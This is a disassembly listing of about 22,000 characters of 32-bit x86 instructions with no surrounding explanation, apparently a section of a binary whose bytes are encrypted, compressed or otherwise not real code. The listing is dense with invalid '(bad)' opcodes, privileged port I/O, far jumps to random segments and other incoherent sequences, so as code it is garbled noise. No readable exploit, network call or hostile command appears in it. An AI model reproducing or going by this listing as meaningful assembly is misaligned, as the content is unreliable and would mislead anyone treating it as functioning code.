  40d132:	mov    esi,0xe8e4f290
  40d137:	repnz outs dx,BYTE PTR ds:[esi]
  40d139:	push   esp
  40d13a:	gs jmp 0xd05cf509
  40d140:	cld    
  40d141:	and    ch,dh
  40d143:	es dec esi
  40d145:	in     al,0x24
  40d147:	cmp    DWORD PTR [edi+0x5634455b],edx
  40d14d:	dec    edx
  40d14e:	aaa    
  40d14f:	dec    ebp
  40d150:	stc    
  40d151:	push   cs
  40d152:	xchg   ebp,eax
  40d153:	push   es
  40d154:	xchg   edi,eax
  40d155:	sub    edx,edx
  40d157:	(bad)  
  40d158:	cmp    dl,BYTE PTR [edi]
  40d15a:	add    al,0x67
  40d15c:	dec    edi
  40d15d:	out    dx,al
  40d15e:	loope  0x40d1c6
  40d160:	inc    eax
  40d161:	jmp    0x40d131
  40d163:	cmp    eax,ecx
  40d165:	sahf   
  40d166:	and    ah,BYTE PTR [ecx]
  40d168:	cmp    edx,DWORD PTR [edi+0x71]
  40d16b:	or     al,0xb5
  40d16d:	mov    edx,0x945a5ca7
  40d172:	pop    edi
  40d173:	cmc    
  40d174:	aam    0x2d
  40d176:	xchg   esi,eax
  40d177:	cmp    DWORD PTR [edx+0x415d9c40],eax
  40d17d:	fbstp  TBYTE PTR [edi+eiz*4]
  40d180:	sub    bh,bl
  40d182:	mov    esp,0x6aefbd78
  40d187:	adc    al,0xe0
  40d189:	(bad)  
  40d18a:	lods   al,BYTE PTR ds:[esi]
  40d18b:	stos   DWORD PTR es:[edi],eax
  40d18c:	shr    BYTE PTR [edx+edx*2-0x6eed52e0],0xc0
  40d194:	sub    DWORD PTR [ebp-0x671948ce],0x2a
  40d19b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d19c:	scas   eax,DWORD PTR es:[edi]
  40d19d:	push   edi
  40d19e:	stos   DWORD PTR es:[edi],eax
  40d19f:	icebp  
  40d1a0:	mov    ah,0x3d
  40d1a2:	dec    esi
  40d1a3:	adc    dh,BYTE PTR [edi+edx*1-0x55522224]
  40d1aa:	div    DWORD PTR [ecx+0x78]
  40d1ad:	push   0xc8208c47
  40d1b2:	loopne 0x40d1bc
  40d1b4:	push   edx
  40d1b5:	sub    eax,0xc94bc31a
  40d1ba:	push   eax
  40d1bb:	div    al
  40d1bd:	add    al,0x23
  40d1bf:	adc    edi,DWORD PTR [esi+0xc]
  40d1c2:	aam    0x13
  40d1c4:	mov    ecx,0x916bf56b
  40d1c9:	int3   
  40d1ca:	stos   BYTE PTR es:[edi],al
  40d1cb:	jp     0x40d1f0
  40d1cd:	sbb    esp,DWORD PTR [ecx+0x62]
  40d1d0:	shl    DWORD PTR [esi],cl
  40d1d2:	ss iret 
  40d1d4:	xlat   BYTE PTR ds:[ebx]
  40d1d5:	xor    ebp,0x54
  40d1d8:	fucom  st(1)
  40d1da:	jbe    0x40d1f9
  40d1dc:	enter  0x4901,0x28
  40d1e0:	xchg   esp,eax
  40d1e1:	mov    ch,0x43
  40d1e3:	fs call 0xf9aa974d
  40d1e9:	jno    0x40d244
  40d1eb:	mov    ds:0xb24d36e2,eax
  40d1f0:	out    0x89,eax
  40d1f2:	(bad)  
  40d1f3:	(bad)  
  40d1f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1f5:	out    0x2a,eax
  40d1f7:	pop    esp
  40d1f8:	xchg   ebx,eax
  40d1f9:	cld    
  40d1fa:	adc    bl,BYTE PTR [ebp-0xb095cc1]
  40d200:	into   
  40d201:	jae    0x40d225
  40d203:	outs   dx,DWORD PTR ds:[esi]
  40d204:	jge    0x40d18f
  40d206:	pop    ss
  40d207:	out    0x6a,al
  40d209:	rcl    DWORD PTR [ebp+0x75d6222c],0x1c
  40d210:	loopne 0x40d24b
  40d212:	xor    al,cl
  40d214:	lods   al,BYTE PTR ds:[esi]
  40d215:	mov    cl,BYTE PTR [ebx+0xddc3613]
  40d21b:	icebp  
  40d21c:	lds    ecx,FWORD PTR [edx+0xe]
  40d21f:	sub    ebp,DWORD PTR [edx-0x20]
  40d222:	jp     0x40d290
  40d224:	es scas al,BYTE PTR es:[edi]
  40d226:	rcl    DWORD PTR [edi],cl
  40d228:	xlat   BYTE PTR ds:[ebx]
  40d229:	cwde   
  40d22a:	neg    BYTE PTR [ebp-0x29]
  40d22d:	and    BYTE PTR ds:0xe9ea02b5,dl
  40d233:	imul   edi,DWORD PTR [ebx-0x529b65af],0x625a593e
  40d23d:	sbb    dh,BYTE PTR [edx-0x2aab232a]
  40d243:	mov    ecx,0x16ccce7b
  40d248:	sub    al,0xfa
  40d24a:	iret   
  40d24b:	push   esp
  40d24c:	or     eax,0x6e96e3c6
  40d251:	pop    es
  40d252:	scas   eax,DWORD PTR es:[edi]
  40d253:	inc    esp
  40d254:	fucom  st(7)
  40d256:	ss cli 
  40d258:	fcom   QWORD PTR [edi+0x7]
  40d25b:	iret   
  40d25c:	outs   dx,WORD PTR ds:[esi]
  40d25e:	xchg   esi,eax
  40d25f:	mov    edx,0xbe55968b
  40d264:	das    
  40d265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d266:	repnz mov al,gs:0x6ec7f4a1
  40d26d:	xor    dl,BYTE PTR [ebx+0x1f279ff5]
  40d273:	lahf   
  40d274:	mov    ds:0x74d490f5,al
  40d279:	add    dl,ah
  40d27b:	in     eax,0xcc
  40d27d:	sub    al,0x87
  40d27f:	outs   dx,BYTE PTR ds:[esi]
  40d280:	ja     0x40d2ba
  40d282:	cmp    BYTE PTR [ebx-0x3],dl
  40d285:	and    al,0x42
  40d287:	or     ebp,DWORD PTR [edi-0x3c]
  40d28a:	gs ret 0xfd92
  40d28e:	mov    al,ds:0x764acd05
  40d293:	jmp    0x6172f132
  40d298:	scas   al,BYTE PTR es:[edi]
  40d299:	mov    ds:0x4a9c6854,eax
  40d29e:	sbb    eax,esi
  40d2a0:	cwde   
  40d2a1:	fsub   DWORD PTR fs:[eax+0x3f]
  40d2a5:	stos   BYTE PTR es:[edi],al
  40d2a6:	mov    bh,0xa1
  40d2a8:	dec    esi
  40d2a9:	cdq    
  40d2aa:	mov    dl,0x20
  40d2ac:	stc    
  40d2ad:	in     eax,dx
  40d2ae:	adc    eax,ebp
  40d2b0:	mov    ebp,DWORD PTR [edx]
  40d2b2:	inc    eax
  40d2b3:	ror    DWORD PTR ds:0x98ba6f07,cl
  40d2b9:	pushf  
  40d2ba:	imul   edx,DWORD PTR [edx-0x7e81fd44],0x14
  40d2c1:	jo     0x40d2f1
  40d2c3:	cld    
  40d2c4:	mov    bl,0xd7
  40d2c6:	dec    eax
  40d2c7:	mov    ds:0xee6586a7,al
  40d2cc:	mov    bl,0xc4
  40d2ce:	out    dx,al
  40d2cf:	sbb    eax,0x2947a838
  40d2d4:	leave  
  40d2d5:	xchg   ebp,eax
  40d2d6:	call   0x6566:0xd82ea15e
  40d2dd:	pop    ss
  40d2de:	fdecstp 
  40d2e0:	(bad)  
  40d2e1:	push   ebp
  40d2e2:	inc    esi
  40d2e3:	cmp    al,0x78
  40d2e5:	push   edi
  40d2e6:	lock mov ebx,0x8c97cf60
  40d2ec:	es push eax
  40d2ee:	sub    dl,BYTE PTR [esi]
  40d2f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2f1:	out    dx,eax
  40d2f2:	jmp    0xba75a93c
  40d2f7:	pop    edx
  40d2f8:	adc    edx,edx
  40d2fa:	shl    DWORD PTR [eax-0x3c9bce4c],1
  40d300:	xchg   ebp,edi
  40d302:	jle    0x40d351
  40d304:	cmp    al,0xbb
  40d306:	sbb    BYTE PTR [ebp+0x5e],ch
  40d309:	jge    0x40d2a8
  40d30b:	xchg   esp,eax
  40d30c:	pop    ecx
  40d30d:	loope  0x40d365
  40d30f:	push   ds
  40d310:	div    BYTE PTR [esi+0x4b56267c]
  40d316:	cmp    al,0xdc
  40d318:	fmul   QWORD PTR [ecx+eax*1+0x30dd9da]
  40d31f:	xor    edx,DWORD PTR [eax+0x14]
  40d322:	inc    edx
  40d323:	adc    DWORD PTR [edx],eax
  40d325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d326:	fcom   DWORD PTR [ebx]
  40d328:	sti    
  40d329:	lods   eax,DWORD PTR ds:[esi]
  40d32a:	add    edi,ebp
  40d32c:	push   ss
  40d32d:	push   es
  40d32e:	jmp    0x2c33:0x47a497f6
  40d335:	add    DWORD PTR [eax+0x69],eax
  40d338:	(bad)  
  40d339:	test   eax,0x5be1b41e
  40d33e:	outs   dx,BYTE PTR ds:[esi]
  40d33f:	test   BYTE PTR [edx+0x165a3575],0x20
  40d346:	mov    dl,0xd8
  40d348:	mov    cl,0xf4
  40d34a:	xor    dh,BYTE PTR [esi-0x7d22902f]
  40d350:	stc    
  40d351:	or     eax,0x88cbd8a1
  40d356:	in     eax,0x7f
  40d358:	dec    ecx
  40d359:	(bad)  [edx-0x26]
  40d35c:	cmp    eax,DWORD PTR [ebx]
  40d35e:	cmp    dl,dh
  40d360:	imul   ecx,DWORD PTR [eax-0x55ed177a],0xffffffa3
  40d367:	dec    ecx
  40d368:	ficomp DWORD PTR [ebx+0x2a]
  40d36b:	ror    BYTE PTR [edx],cl
  40d36d:	jne    0x40d303
  40d36f:	icebp  
  40d370:	in     al,dx
  40d371:	fistp  DWORD PTR [esi]
  40d373:	jbe    0x40d336
  40d375:	sub    eax,0xf7236749
  40d37a:	and    ecx,DWORD PTR [eax+ebx*1]
  40d37d:	out    0x40,eax
  40d37f:	xchg   BYTE PTR [eax-0x202d2852],cl
  40d385:	(bad)
  40d389:	out    dx,al
  40d38a:	jg     0x40d3d1
  40d38c:	mov    edx,0x7e58e33a
  40d391:	mov    ebx,DWORD PTR [ecx-0x62d68c2e]
  40d397:	or     al,0x78
  40d399:	xor    al,0x4c
  40d39b:	mov    ah,0xbd
  40d39d:	(bad)  
  40d39e:	fnstenv [edx]
  40d3a0:	iret   
  40d3a1:	ret    
  40d3a2:	add    ecx,DWORD PTR [ecx-0x43]
  40d3a5:	hlt    
  40d3a6:	jecxz  0x40d3cb
  40d3a8:	add    esi,eax
  40d3aa:	pushf  
  40d3ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3ac:	test   DWORD PTR [edx],ebp
  40d3ae:	xchg   ecx,eax
  40d3af:	repnz enter 0xef9,0x8b
  40d3b4:	or     al,0xc5
  40d3b6:	xchg   esp,eax
  40d3b7:	lock ret 
  40d3b9:	xor    ch,cl
  40d3bb:	fidivr WORD PTR [eax-0x365c226]
  40d3c1:	add    eax,0x68d4dec5
  40d3c6:	jne    0x40d417
  40d3c8:	push   ebx
  40d3c9:	xor    esi,esi
  40d3cb:	retf   
  40d3cc:	push   edi
  40d3cd:	(bad)  
  40d3ce:	nop
  40d3cf:	out    0x63,al
  40d3d1:	ret    
  40d3d2:	push   ss
  40d3d3:	retf   0xcc1b
  40d3d6:	or     eax,0xf4a91c54
  40d3db:	call   0x91fec76c
  40d3e0:	pop    esi
  40d3e1:	loopne 0x40d3a2
  40d3e3:	jl     0x40d41b
  40d3e5:	call   0x7ae1109c
  40d3ea:	mov    DWORD PTR [ecx-0x160294fd],ebp
  40d3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3f1:	mov    ch,0xf7
  40d3f3:	test   DWORD PTR [esi+0x39bb4eba],ecx
  40d3f9:	and    BYTE PTR [edi-0x433a6e05],dl
  40d3ff:	pop    es
  40d400:	xchg   BYTE PTR [eax-0x5ac9f990],bh
  40d406:	push   eax
  40d407:	jo     0x40d40e
  40d409:	dec    esi
  40d40a:	xor    al,0x61
  40d40c:	cmp    eax,0xdd97bc37
  40d411:	pop    ebp
  40d412:	mov    edi,0x35965b10
  40d417:	jmp    0xf196:0xbd4e7982
  40d41e:	retf   0xbf4c
  40d421:	lods   al,BYTE PTR ds:[esi]
  40d422:	sbb    DWORD PTR [ecx+0x41],ebx
  40d425:	cli    
  40d426:	adc    eax,0x2070670e
  40d42b:	xor    eax,0xa4ff3acc
  40d430:	xchg   ebx,eax
  40d431:	packsswb mm3,QWORD PTR [esi]
  40d434:	das    
  40d435:	mov    bl,0x20
  40d437:	mov    ebp,0x79377aa3
  40d43c:	fnstcw WORD PTR [ebx+0x29]
  40d43f:	inc    ebp
  40d440:	pop    es
  40d441:	inc    ebx
  40d442:	stc    
  40d443:	xchg   esp,eax
  40d444:	jnp    0x40d482
  40d446:	getsec 
  40d448:	cmp    eax,0x305ca87c
  40d44d:	push   0xb
  40d44f:	push   ss
  40d450:	mov    DWORD PTR [ecx+0x5e],esi
  40d453:	push   es
  40d454:	mov    ds:0x7cbd7030,al
  40d459:	lods   eax,DWORD PTR ds:[esi]
  40d45a:	cmp    ch,BYTE PTR [eax+0x7a]
  40d45d:	lahf   
  40d45e:	test   al,0x86
  40d460:	mov    DWORD PTR [esi-0x1ad52ab4],ebp
  40d466:	push   es
  40d467:	push   esp
  40d468:	adc    DWORD PTR [ebx],esi
  40d46a:	fisubr WORD PTR [esi-0x3e]
  40d46d:	retf   0xb7cd
  40d470:	xchg   edx,eax
  40d471:	dec    ebp
  40d472:	mov    ah,BYTE PTR [eax-0x1e262174]
  40d478:	add    BYTE PTR [ecx],0xe0
  40d47b:	mov    ds:0xf40682c7,al
  40d480:	xchg   ebx,eax
  40d481:	sbb    BYTE PTR [eax],dh
  40d483:	fdiv   QWORD PTR [edi+0x3078b2c1]
  40d489:	shr    esi,0x7a
  40d48c:	mov    edi,fs
  40d48e:	popf   
  40d48f:	push   ecx
  40d490:	daa    
  40d491:	pop    eax
  40d492:	mov    edi,0xee1cc583
  40d497:	xor    dl,ch
  40d499:	leave  
  40d49a:	out    0xf6,eax
  40d49c:	rcl    BYTE PTR [eax+ebx*2+0x109b1f7a],1
  40d4a3:	mov    ebp,0x4d7fde6a
  40d4a8:	dec    edi
  40d4a9:	lock adc DWORD PTR [edx*8+0xb90c9f],0x7b
  40d4b2:	iret   
  40d4b3:	ss inc ebx
  40d4b5:	jecxz  0x40d4b0
  40d4b7:	push   ecx
  40d4b8:	xchg   ebx,eax
  40d4b9:	fs js  0x40d51d
  40d4bc:	inc    esi
  40d4bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4be:	xor    ch,BYTE PTR [ebx-0x1c]
  40d4c1:	xchg   esi,eax
  40d4c2:	call   0xb020:0xe1a6f8df
  40d4c9:	sahf   
  40d4ca:	inc    ebp
  40d4cb:	icebp  
  40d4cc:	mov    DWORD PTR [ebp+0x6f8207a9],ebx
  40d4d2:	xor    edi,DWORD PTR [ecx-0x74]
  40d4d5:	nop
  40d4d6:	mov    eax,ds:0xe3b60899
  40d4db:	cli    
  40d4dc:	or     eax,0x64726933
  40d4e1:	loop   0x40d468
  40d4e3:	mov    al,ds:0x6cb4b731
  40d4e8:	push   ebp
  40d4e9:	in     eax,0xc4
  40d4eb:	lea    ebx,[esi+0x1bba9c54]
  40d4f1:	jns    0x40d4ab
  40d4f3:	inc    edx
  40d4f4:	jg     0x40d494
  40d4f6:	cmp    DWORD PTR [esi-0xf],0xd629916f
  40d4fd:	jg     0x40d578
  40d4ff:	add    DWORD PTR [edi+0x41513467],0xc724d75f
  40d509:	push   ss
  40d50a:	pause  
  40d50c:	aas    
  40d50d:	scas   eax,DWORD PTR es:[edi]
  40d50e:	fwait
  40d50f:	aas    
  40d510:	sbb    DWORD PTR [edx+edx*1+0x3c],eax
  40d514:	push   esp
  40d515:	call   FWORD PTR [eax-0x1b5791fc]
  40d51b:	or     BYTE PTR [ecx],0xf8
  40d51e:	dec    ebx
  40d51f:	adc    edx,DWORD PTR [ecx]
  40d521:	pop    ds
  40d522:	imul   bl
  40d524:	mov    esi,0x4af5bb05
  40d529:	push   es
  40d52a:	aaa    
  40d52b:	les    esi,FWORD PTR [edx+0x4104665f]
  40d531:	(bad)  [esi]
  40d533:	loop   0x40d570
  40d535:	mov    esp,0xd1056c3f
  40d53a:	add    BYTE PTR [ebp-0x5135be44],ch
  40d540:	sahf   
  40d541:	adc    DWORD PTR [eax-0x592eefda],ebx
  40d547:	sbb    eax,0xa418c5bf
  40d54c:	or     DWORD PTR [eax+0x3c6b88e4],edi
  40d552:	ds add eax,0x3043d241
  40d558:	add    al,0xe0
  40d55a:	jmp    0xe66753df
  40d55f:	push   cs
  40d560:	xchg   esp,eax
  40d561:	jb     0x40d5c1
  40d563:	cld    
  40d564:	xor    edi,DWORD PTR [ecx-0x2]
  40d567:	ja     0x40d554
  40d569:	jg     0x40d59e
  40d56b:	jle    0x40d58d
  40d56d:	hlt    
  40d56e:	cwde   
  40d56f:	cld    
  40d570:	leave  
  40d571:	(bad)  
  40d573:	xor    DWORD PTR [esi+0x31],ecx
  40d576:	in     al,dx
  40d577:	dec    edi
  40d578:	push   esp
  40d579:	loop   0x40d519
  40d57b:	push   edx
  40d57c:	add    al,0x9d
  40d57e:	jae    0x40d54b
  40d580:	loope  0x40d546
  40d582:	jmp    0x40d554
  40d584:	int3   
  40d585:	and    ecx,edx
  40d587:	push   ss
  40d588:	push   ebp
  40d589:	test   eax,0x7a31928e
  40d58e:	out    0x95,eax
  40d590:	sub    al,0x60
  40d592:	mov    eax,0xdd5fc448
  40d597:	push   eax
  40d598:	gs sub al,0x28
  40d59b:	add    ebp,esp
  40d59d:	xchg   ebp,eax
  40d59e:	scas   al,BYTE PTR es:[edi]
  40d59f:	in     eax,dx
  40d5a0:	repz fdiv st,st(4)
  40d5a3:	inc    esi
  40d5a4:	retf   0x7116
  40d5a7:	xlat   BYTE PTR ds:[ebx]
  40d5a8:	push   cs
  40d5a9:	(bad)  
  40d5aa:	sbb    al,0x4d
  40d5ac:	sub    al,0xb3
  40d5ae:	imul   edx,DWORD PTR ds:0xf74405fe,0x55bb14be
  40d5b8:	mov    WORD PTR [edi+esi*4+0x3d],?
  40d5bc:	push   esp
  40d5bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5be:	(bad)  
  40d5bf:	or     al,0x1
  40d5c1:	pop    edx
  40d5c2:	jp     0x40d62a
  40d5c4:	jb     0x40d564
  40d5c6:	mov    BYTE PTR [edx],al
  40d5c8:	(bad)  
  40d5c9:	not    DWORD PTR [ebx+eax*1+0x2a]
  40d5cd:	jecxz  0x40d63f
  40d5cf:	jno    0x40d5ec
  40d5d1:	and    DWORD PTR [ecx+0x9378502],ebp
  40d5d7:	or     BYTE PTR ss:[ebx+0x1aef6e69],bh
  40d5de:	ds icebp 
  40d5e0:	fcom   st(7)
  40d5e2:	mov    ds:0x16900464,eax
  40d5e7:	loop   0x40d5e3
  40d5e9:	adc    dl,BYTE PTR ds:0xe7dd5eaa
  40d5ef:	pop    ss
  40d5f0:	dec    ebp
  40d5f1:	ror    ah,1
  40d5f3:	add    edi,edx
  40d5f5:	jmp    0x779d:0xd4725f07
  40d5fc:	sub    BYTE PTR [edx],bl
  40d5fe:	pop    esi
  40d5ff:	or     BYTE PTR [edi],dl
  40d601:	pop    ebx
  40d602:	cld    
  40d603:	jmp    0x4c6c5079
  40d608:	dec    edx
  40d609:	test   BYTE PTR [eax],bh
  40d60b:	jge    0x40d656
  40d60d:	sub    DWORD PTR [esi],ebp
  40d60f:	ror    eax,1
  40d611:	mov    DWORD PTR [edx+0x5a],esp
  40d614:	mov    edx,0x8fa3dd1e
  40d619:	dec    edi
  40d61a:	mov    edx,DWORD PTR [ebx+0x1b030f9a]
  40d620:	adc    esp,ecx
  40d622:	nop
  40d623:	cmp    ah,al
  40d625:	std    
  40d626:	jmp    0x8637:0xae22c978
  40d62d:	add    dl,bh
  40d62f:	mov    edi,0x3d5184f3
  40d634:	call   0xc41e:0xa775aae8
  40d63b:	mov    bl,0x46
  40d63d:	sub    esp,ebp
  40d63f:	inc    esi
  40d640:	xor    eax,0x11afb055
  40d645:	aad    0xce
  40d647:	cld    
  40d648:	push   edi
  40d649:	fsub   QWORD PTR [eax+ecx*1+0x7b98459d]
  40d650:	inc    esi
  40d651:	push   es
  40d652:	and    dl,BYTE PTR [edi]
  40d654:	loope  0x40d664
  40d656:	in     al,dx
  40d657:	(bad)  
  40d658:	icebp  
  40d659:	cmc    
  40d65a:	inc    ebp
  40d65b:	sbb    BYTE PTR [ebx+0x3066ce6e],al
  40d661:	push   es
  40d662:	out    dx,eax
  40d663:	xchg   edx,eax
  40d664:	stos   BYTE PTR es:[edi],al
  40d665:	fs sbb al,0x9f
  40d668:	xchg   BYTE PTR [esi+esi*8+0x5b],bh
  40d66c:	sbb    BYTE PTR [eax+edi*2],0x98
  40d670:	sub    esi,DWORD PTR [esi+ecx*1]
  40d673:	sahf   
  40d674:	mov    ah,0x55
  40d676:	mov    dh,0xa5
  40d678:	and    ah,BYTE PTR [edi+0x3c135d0a]
  40d67e:	repnz mov ch,0x23
  40d681:	les    edi,FWORD PTR [ebx-0x61f64da1]
  40d687:	addr16 and eax,0x5605a27f
  40d68d:	xlat   BYTE PTR ds:[ebx]
  40d68e:	push   es
  40d68f:	mov    dh,0x9d
  40d691:	out    0x42,eax
  40d693:	int3   
  40d694:	popa   
  40d695:	xor    DWORD PTR [edi-0x65],esi
  40d698:	mov    cl,0x73
  40d69a:	sbb    DWORD PTR [ebp+0x5c],ecx
  40d69d:	pop    eax
  40d69e:	leave  
  40d69f:	add    DWORD PTR [ecx+esi*8-0x39],0x998a3184
  40d6a7:	xchg   edi,eax
  40d6a8:	mov    ch,0xac
  40d6aa:	inc    ebx
  40d6ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ac:	dec    eax
  40d6ad:	call   DWORD PTR [edx-0x7941c785]
  40d6b3:	inc    edi
  40d6b4:	test   esp,0x7bccbf5d
  40d6ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6bb:	and    al,0xc5
  40d6bd:	xchg   dl,dl
  40d6bf:	push   ecx
  40d6c0:	in     eax,dx
  40d6c1:	lea    ecx,[ebp-0x720fa3df]
  40d6c7:	fisub  DWORD PTR [ebx+ebx*8+0x375002f1]
  40d6ce:	fcom   st(2)
  40d6d0:	mov    edi,0x42f3853d
  40d6d5:	popf   
  40d6d6:	pop    ebp
  40d6d7:	xchg   ebx,eax
  40d6d8:	sub    DWORD PTR [ebx],ecx
  40d6da:	fstp   QWORD PTR [edi-0x24]
  40d6dd:	in     eax,0x48
  40d6df:	stos   BYTE PTR es:[edi],al
  40d6e0:	es pop esi
  40d6e2:	pop    ecx
  40d6e3:	xchg   DWORD PTR [ebx+0x1969dbf2],ebp
  40d6e9:	cs dec ebp
  40d6eb:	ret    0xd2a1
  40d6ee:	shl    DWORD PTR [edx-0x487dfe68],0xd3
  40d6f5:	mov    ds:0xf01f6795,al
  40d6fa:	add    eax,0xb8a0cc36
  40d6ff:	jge    0x40d697
  40d701:	shl    BYTE PTR [ecx],0xf6
  40d704:	adc    ah,0xd7
  40d707:	out    dx,al
  40d708:	dec    esp
  40d709:	sub    al,BYTE PTR gs:[ecx+esi*8]
  40d70d:	or     DWORD PTR [edi+0x63],edx
  40d710:	bound  esi,QWORD PTR [edi]
  40d712:	fmul   st,st(6)
  40d714:	sub    al,0x29
  40d716:	mov    edi,0x3742201
  40d71b:	(bad)  
  40d71d:	sbb    DWORD PTR [ecx+eax*2-0x6a1d94b8],eax
  40d724:	push   cs
  40d725:	dec    ebp
  40d726:	in     eax,0x5a
  40d728:	push   edi
  40d729:	sbb    cl,BYTE PTR [ebx]
  40d72b:	sbb    esi,DWORD PTR [esi-0x20e63d0e]
  40d731:	xor    ah,BYTE PTR [ebx-0x53a772eb]
  40d737:	inc    di
  40d739:	bound  esp,QWORD PTR [ebx+0x21]
  40d73c:	xchg   ebp,eax
  40d73d:	in     al,0x8
  40d73f:	jo     0x40d796
  40d741:	push   ss
  40d742:	and    ch,BYTE PTR [ebx]
  40d744:	out    dx,al
  40d745:	iret   
  40d746:	aas    
  40d747:	(bad)  
  40d748:	fild   WORD PTR [edi-0x6c66685b]
  40d74e:	fnstcw WORD PTR [ebx+edx*2]
  40d751:	nop
  40d752:	dec    edi
  40d753:	je     0x40d6f4
  40d755:	sbb    eax,0xac58fba6
  40d75a:	push   es
  40d75b:	fiadd  DWORD PTR [esi+0x15]
  40d75e:	add    eax,eax
  40d760:	data16 mov bl,0xcd
  40d764:	rcr    cl,cl
  40d766:	pop    esp
  40d767:	add    esi,DWORD PTR [edi+0x32]
  40d76a:	jge    0x40d759
  40d76c:	ss pop esp
  40d76e:	stc    
  40d76f:	fnstsw WORD PTR [edi-0x42]
  40d772:	adc    dl,BYTE PTR [edx-0x2f]
  40d775:	cld    
  40d776:	mov    esi,0x9d3be78c
  40d77b:	mov    DWORD PTR [eax+ebp*8+0x54],ebp
  40d77f:	add    dh,BYTE PTR [edi-0x434a7959]
  40d785:	test   DWORD PTR [ebx+eiz*2-0x7ab5785c],0x32391b1d
  40d790:	and    al,BYTE PTR [edi+0x3a02cb27]
  40d796:	mov    ebp,ecx
  40d798:	jns    0x40d731
  40d79a:	add    eax,0xf22d0230
  40d79f:	nop
  40d7a0:	or     al,0x6
  40d7a2:	data16 jecxz 0x40d797
  40d7a5:	ror    DWORD PTR [edi-0x7ca31fd0],1
  40d7ab:	hlt    
  40d7ac:	icebp  
  40d7ad:	arpl   WORD PTR [esi+0x23],sp
  40d7b0:	sub    al,0x20
  40d7b2:	(bad)  [edx+0x20]
  40d7b5:	mov    eax,es:0xd01f5b45
  40d7bb:	ret    0xc463
  40d7be:	push   ebp
  40d7bf:	lahf   
  40d7c0:	xchg   ecx,eax
  40d7c1:	mov    ah,0xfb
  40d7c3:	mov    edi,0x4d391d4e
  40d7c8:	jge    0x40d7e9
  40d7ca:	sbb    DWORD PTR [ecx-0x10],edi
  40d7cd:	push   esp
  40d7ce:	xor    bl,BYTE PTR [eax+ecx*4]
  40d7d1:	adc    al,ah
  40d7d3:	in     al,dx
  40d7d4:	stos   BYTE PTR es:[edi],al
  40d7d5:	stos   DWORD PTR es:[edi],eax
  40d7d6:	push   ecx
  40d7d7:	das    
  40d7d8:	iret   
  40d7d9:	inc    ebx
  40d7da:	dec    ebp
  40d7db:	lock push 0x35c5287f
  40d7e1:	lods   al,BYTE PTR ds:[esi]
  40d7e2:	fnstsw WORD PTR [esp+esi*4]
  40d7e5:	jbe    0x40d774
  40d7e7:	(bad)  
  40d7e8:	mov    esp,0x4faedd55
  40d7ed:	nop
  40d7ee:	jl     0x40d7ee
  40d7f0:	pop    edi
  40d7f1:	xchg   esi,eax
  40d7f2:	jno    0x40d845
  40d7f4:	repz and cl,BYTE PTR ds:[ecx-0x54]
  40d7f9:	repz and esi,DWORD PTR [edi+esi*2-0x56]
  40d7fe:	aas    
  40d7ff:	or     bl,al
  40d801:	out    dx,eax
  40d802:	pop    esp
  40d803:	repz fs xchg edi,eax
  40d806:	test   al,0xf5
  40d808:	mov    ds:0xa74f10a9,eax
  40d80d:	pop    esp
  40d80e:	ret    
  40d80f:	loop   0x40d7f5
  40d811:	cmp    al,0xb2
  40d813:	ret    
  40d814:	or     esi,esi
  40d816:	inc    edi
  40d817:	fcomp  st(0)
  40d819:	sbb    ah,ch
  40d81b:	cmp    al,0x1c
  40d81d:	add    DWORD PTR [ebx-0x747f46e0],esp
  40d823:	hlt    
  40d824:	cdq    
  40d825:	cmc    
  40d826:	stc    
  40d827:	stc    
  40d828:	cmp    BYTE PTR [ecx],0xf9
  40d82b:	dec    esp
  40d82c:	cmp    DWORD PTR [ebx+0x36],eax
  40d82f:	push   ds
  40d830:	stos   BYTE PTR es:[edi],al
  40d831:	mov    bh,0x2a
  40d833:	and    ah,BYTE PTR [eax+eax*2-0x53]
  40d837:	(bad)
  40d83a:	stos   DWORD PTR es:[edi],eax
  40d83b:	xchg   edx,eax
  40d83c:	pop    ebx
  40d83d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d83e:	jle    0x40d82e
  40d840:	sbb    esi,0xffffffc9
  40d843:	repz inc esp
  40d845:	int3   
  40d846:	pop    edi
  40d847:	or     ebp,edx
  40d849:	cmp    BYTE PTR [edx+0x78],dl
  40d84c:	stos   DWORD PTR es:[edi],eax
  40d84d:	sub    eax,0x313f079f
  40d852:	sbb    al,0x2f
  40d854:	xor    bh,BYTE PTR [edi+0x53]
  40d857:	xor    BYTE PTR [edx-0x201e3d0],al
  40d85d:	pushf  
  40d85e:	aad    0x52
  40d860:	dec    BYTE PTR [ebp-0x4bd10c35]
  40d866:	jae    0x40d82e
  40d868:	neg    BYTE PTR [ebx+0x46281cf2]
  40d86e:	aam    0x22
  40d870:	push   ss
  40d871:	shl    BYTE PTR [ebx+ecx*8-0x61],1
  40d875:	test   DWORD PTR [ecx+0x37],edx
  40d878:	xor    BYTE PTR [esi],bl
  40d87a:	pop    eax
  40d87b:	mov    ch,0x67
  40d87d:	xchg   esp,edi
  40d87f:	xchg   ebx,eax
  40d880:	xor    DWORD PTR [edx+0x2a732b44],eax
  40d886:	cli    
  40d887:	mov    al,ds:0x81a5c204
  40d88c:	data16 xor al,0x58
  40d88f:	mov    ebx,0x1cbfc77
  40d894:	inc    ebp
  40d895:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d896:	or     eax,0xbe8ac7e8
  40d89b:	inc    ebx
  40d89c:	cmp    bh,BYTE PTR [ebp-0x4b]
  40d89f:	mov    BYTE PTR [eax-0x271cfc96],0xe5
  40d8a6:	xchg   ecx,eax
  40d8a7:	loop   0x40d911
  40d8a9:	mov    bl,0x92
  40d8ab:	call   0xb0d2ebcd
  40d8b0:	add    BYTE PTR [esi-0x7edb568e],bl
  40d8b6:	and    BYTE PTR [ecx+0x24050a89],bh
  40d8bc:	jns    0x40d913
